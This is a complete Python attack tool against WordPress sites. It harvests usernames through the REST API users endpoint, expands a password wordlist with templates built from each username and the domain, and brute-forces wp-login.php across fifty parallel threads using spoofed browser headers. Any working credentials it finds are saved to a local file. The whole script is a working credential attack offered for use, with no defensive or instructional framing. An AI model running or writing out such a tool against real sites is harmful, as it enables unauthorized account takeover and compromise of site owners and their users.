import requests, os, colorama, re, sys
from multiprocessing.dummy import Pool
from tqdm import tqdm
from datetime import datetime

os.system('cls' if os.name == 'nt' else 'clear')

green = colorama.Fore.LIGHTGREEN_EX
reset = colorama.Fore.RESET
blue = colorama.Fore.LIGHTBLACK_EX
red = colorama.Fore.LIGHTRED_EX
domain = sys.argv[1]
passwords_file = "passwords.txt"
gates = ["/wp-json/wp/v2/users"]
login_gate = "/wp-login.php"
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7,ar;q=0.6',
    'Cache-Control': 'max-age=0',
    'Content-Length': '',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': '',
    'Priority': 'u=0, i',
    'Cookie':'wordpress_test_cookie=WP%20Cookie%20check',
    'Referer': '',
    'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
}

def add_gates():
    for _ in range(1,11):
        gates.append('/wp-json/wp/v2/users/'+str(_))
add_gates()

usernames = []
infos = []


def enumerate_usernames(domain):
    if domain.startswith('https://') or domain.startswith('http://'):
        if domain.count('/') > 2:
            domain = domain.split('/')[0] + '//' +domain.split('/')[2]
    print(f"[+] {green}Enumerating usernames ...{reset}")
    for gate in tqdm(gates):
        try:
            url = domain + gate
            #print(f'Trying Gate {gates.index(gate)} ...')
            response = requests.get(url,headers={"user-agent":"Mozilla/5.0"},timeout=25)
            if response.status_code in [200,202]:
                users_found = re.findall('"slug":"(.*?)"',response.text)
                for usern in users_found:
                    if usern not in usernames:
                        usernames.append(usern)
        except:
            pass # Unexcepted Error
    print(f"[+] {green}Scan Finished with {reset}'{len(usernames)}'{green} "+("Usernames "if len(usernames) > 1 else "Username ") + f"{reset}({', '.join(usernames)})")
def brute_login(info):
    global domain
    if domain.startswith('https://') or domain.startswith('http://'):
        if domain.count('/') > 2:
            domain = domain.split('/')[0] + '//' +domain.split('/')[2]
    username,password = info
    data = f"log={username}&pwd={password}&wp-submit=Log+In&redirect_to={domain}%2Fwp-admin%2F&testcookie=1"
    headers["Content-Length"] = str(len(data))
    headers["Referer"] = domain + "/wp-login.php"    
    headers["Origin"] = domain
    try:
        response = requests.post(
            domain + login_gate,
            headers=headers,
            data=data,
            timeout=25
        )
        if response.status_code == 302 or "location" in response.headers:
            print(f"[+] {green}Username:\t{reset}{username}\t| {green}Password:\t{reset}{password}\t{green} => Password is Valid !")
            open(domain.replace('http://','').replace('https://','')+'.txt','a').write(username+':'+password+'\n')
            return True
        else:
            open('response.html','wb').write(response.content)
            print(f'[!] {red}Username:\t{reset}{username}\t| {red}Password:\t{reset}{password}\t{red} => Password is incorrect !')
            return False
    except Exception as ex:
        print(ex)
        pass # Unexcepted Error

def replace_(password,username,domain):
    return password.replace('{user}',username).replace('{user_l}',username.lower()).replace('{user_u}',username.upper()).replace('{domain}',domain).replace('{domain_l}',domain.lower()).replace('{domain_u}',domain.upper()).replace('{domain_center}',domain.replace('www.','').split('.')[0]).replace('{ddomain}',domain[0]+domain)

def generate_infos(passwords,domain):
    if domain.startswith('https://') or domain.startswith('http://'):
        if domain.count('/') > 2:
            domain = domain.split('/')[0] + '//' +domain.split('/')[2]
    domain = domain.replace('https://','').replace('http://','').replace('www.','')
    for password in passwords:
        for username in usernames:
            info = (username,replace_(password,username,domain),)
            if info not in infos:
                infos.append(info)

enumerate_usernames(domain)


generate_infos(open(passwords_file,'r').read().splitlines(),domain)

print(f'{reset}[>] {green}Performing Attack ...\n{green}[Target:]\t{reset}{domain}\n{green}[Passwords File:]\t{reset}{passwords_file}\n{green}[Starting Time:]\t{reset}{str(datetime.now())}')

Pool(50).map(brute_login,infos)

